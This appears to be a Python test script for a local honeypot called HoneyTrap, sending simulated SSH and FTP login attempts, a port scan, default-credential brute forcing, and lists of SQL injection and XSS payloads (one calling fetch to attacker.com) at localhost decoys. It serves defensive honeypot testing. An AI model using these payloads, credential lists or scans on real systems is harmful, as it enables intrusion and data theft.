#!/usr/bin/env python3
"""
HoneyTrap — Attack Simulation Script
Teste tous les services leurres du honeypot
"""

import socket
import requests
import time
import sys
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Configuration
BASE_URL = "http://localhost:5000"
DEBUG = True
TIMEOUT = 5

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


def log_test(service, status, message):
    """Log test result"""
    if status == "✓":
        color = Fore.GREEN
    elif status == "✕":
        color = Fore.RED
    else:
        color = Fore.YELLOW
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] {status} {service:20} → {message}{Style.RESET_ALL}")


def test_ssh_brute_force():
    """Simulate SSH brute force attack on port 22"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 1: SSH Brute-Force Attack (Port 22)")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect(('localhost', 22))
        
        # Send SSH banner grab
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        
        if 'SSH' in response:
            log_test("SSH Banner", "✓", f"Honeypot detected: {response.strip()}")
        
        # Try multiple login attempts (simulate brute force)
        attempts = ['admin:admin', 'root:password', 'test:test', 'user:user']
        for attempt in attempts:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            try:
                sock.connect(('localhost', 22))
                log_test("SSH Attempt", "○", f"Login attempt: {attempt}")
                sock.close()
                time.sleep(0.3)
            except Exception as e:
                pass
        
        log_test("SSH Brute-Force", "✓", f"Attack logged in honeypot")
        
    except Exception as e:
        log_test("SSH Brute-Force", "✕", str(e))


def test_ftp_attack():
    """Simulate FTP attack on port 21"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 2: FTP Brute-Force Attack (Port 21)")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect(('localhost', 21))
        
        response = sock.recv(1024).decode('utf-8', errors='ignore')
        if 'FTP' in response:
            log_test("FTP Banner", "✓", f"FTP Server detected")
        
        # Try FTP login
        sock.sendall(b'USER admin\r\n')
        time.sleep(0.2)
        log_test("FTP Login", "○", "admin:badpassword")
        
        sock.sendall(b'PASS badpassword\r\n')
        time.sleep(0.2)
        
        sock.sendall(b'LIST\r\n')
        time.sleep(0.2)
        
        sock.close()
        log_test("FTP Attack", "✓", "Attack logged in honeypot")
        
    except Exception as e:
        log_test("FTP Attack", "✕", str(e))


def test_http_fake_services():
    """Test HTTP fake services"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 3: HTTP Fake Services")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    fake_services = [
        ('/fake/ssh', 'SSH Terminal', {'username': 'admin', 'password': 'pass123'}),
        ('/fake/ftp', 'FTP Server', {'user': 'admin', 'password': 'secret'}),
        ('/fake/admin', 'WordPress Admin', {'log': 'admin', 'pwd': 'admin123'}),
        ('/fake/phpmyadmin', 'phpMyAdmin', {'pma_username': 'root', 'pma_password': 'password'}),
    ]
    
    for endpoint, service_name, payload in fake_services:
        try:
            url = f"{BASE_URL}{endpoint}"
            response = requests.get(url, timeout=TIMEOUT)
            
            if response.status_code == 200:
                log_test(f"HTTP {service_name}", "✓", f"Leurre accessible (Status: {response.status_code})")
                
                # Try POST with credentials
                try:
                    post_response = requests.post(url, data=payload, timeout=TIMEOUT)
                    log_test(f"Login Attempt", "○", f"{service_name} (with credentials)")
                except:
                    pass
            else:
                log_test(f"HTTP {service_name}", "✕", f"Status: {response.status_code}")
        
        except Exception as e:
            log_test(f"HTTP {service_name}", "✕", str(e))
        
        time.sleep(0.5)


def test_sql_injection():
    """Test SQL injection attacks on fake services"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 4: SQL Injection Attempts")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    sqli_payloads = [
        "1' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL --",
        "1'; DROP TABLE users; --",
        "' OR 1=1 --",
    ]
    
    for payload in sqli_payloads:
        try:
            # Test on different endpoints
            url = f"{BASE_URL}/fake/phpmyadmin?id={payload}"
            response = requests.get(url, timeout=TIMEOUT)
            log_test("SQL Injection", "○", f"Payload: {payload[:30]}...")
            time.sleep(0.3)
        except Exception as e:
            pass
    
    log_test("SQL Injection", "✓", "Multiple SQLi payloads tested")


def test_xss_attacks():
    """Test XSS (Cross-Site Scripting) attacks"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 5: XSS (Cross-Site Scripting) Attempts")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "'\"><script>fetch('http://attacker.com')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
    ]
    
    for payload in xss_payloads:
        try:
            url = f"{BASE_URL}/fake/admin?payload={payload}"
            response = requests.get(url, timeout=TIMEOUT)
            log_test("XSS Attack", "○", f"Payload: {payload[:35]}...")
            time.sleep(0.3)
        except Exception as e:
            pass
    
    log_test("XSS Attacks", "✓", "Multiple XSS payloads tested")


def test_port_scan():
    """Simulate network port scanning"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 6: Port Scanning Detection")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    common_ports = [80, 443, 22, 21, 23, 3306, 5432, 8080, 8443, 9000]
    
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('localhost', port))
            
            if result == 0:
                status = "○"
                msg = "Port OPEN"
            else:
                status = "✕"
                msg = "Port CLOSED"
            
            log_test(f"Port {port}", status, msg)
            sock.close()
            time.sleep(0.2)
        
        except Exception as e:
            pass
    
    log_test("Port Scan", "✓", "Scanning attempt completed")


def test_api_endpoints():
    """Test API endpoints for attack data"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 7: API Endpoints & Data Retrieval")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    api_endpoints = [
        ('/api/attacks', 'Get all attacks'),
        ('/api/health', 'Health check'),
        ('/dashboard', 'Dashboard page'),
    ]
    
    for endpoint, description in api_endpoints:
        try:
            url = f"{BASE_URL}{endpoint}"
            response = requests.get(url, timeout=TIMEOUT)
            
            if response.status_code == 200:
                log_test("API", "✓", f"{description} (Status: 200)")
            else:
                log_test("API", "○", f"{description} (Status: {response.status_code})")
        
        except Exception as e:
            log_test("API", "✕", f"{description} - {str(e)}")
        
        time.sleep(0.3)


def test_brute_force_simulation():
    """Simulate dictionary brute force attacks"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"TEST 8: Dictionary Brute-Force Simulation")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    credentials = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'toor'),
        ('test', 'test'),
        ('guest', 'guest'),
        ('root', 'root'),
        ('admin', '123456'),
    ]
    
    for username, password in credentials:
        try:
            payload = {'username': username, 'password': password}
            url = f"{BASE_URL}/fake/admin"
            response = requests.post(url, data=payload, timeout=TIMEOUT)
            log_test("BruteForce", "○", f"{username}:{password}")
            time.sleep(0.2)
        except Exception as e:
            pass
    
    log_test("Brute-Force", "✓", f"Tested {len(credentials)} credential pairs")


def check_honeypot_running():
    """Check if honeypot is running"""
    try:
        response = requests.get(f"{BASE_URL}/api/health", timeout=3)
        return response.status_code == 200
    except:
        return False


def main():
    """Run all attack simulations"""
    print(f"\n{Fore.YELLOW}{Colors.BOLD}")
    print("╔" + "="*58 + "╗")
    print("║" + " "*58 + "║")
    print("║   HoneyTrap Attack Simulation Suite v1.0           ║")
    print("║   Testing honeypot services & attack detection    ║")
    print("║" + " "*58 + "║")
    print("╚" + "="*58 + "╝")
    print(f"{Style.RESET_ALL}\n")
    
    # Check if honeypot is running
    print(f"{Fore.CYAN}Checking honeypot status...{Style.RESET_ALL}")
    if not check_honeypot_running():
        print(f"{Fore.RED}❌ HoneyTrap is not running on {BASE_URL}")
        print(f"Start it with: docker-compose up{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}✓ HoneyTrap is running!{Style.RESET_ALL}\n")
    
    # Run all tests
    try:
        test_ssh_brute_force()
        test_ftp_attack()
        test_http_fake_services()
        test_sql_injection()
        test_xss_attacks()
        test_port_scan()
        test_api_endpoints()
        test_brute_force_simulation()
        
        # Summary
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓ All attack simulations completed!{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Check the dashboard at:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  → http://localhost:5000/dashboard{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}View API data:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  → http://localhost:5000/api/attacks{Style.RESET_ALL}\n")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Test interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
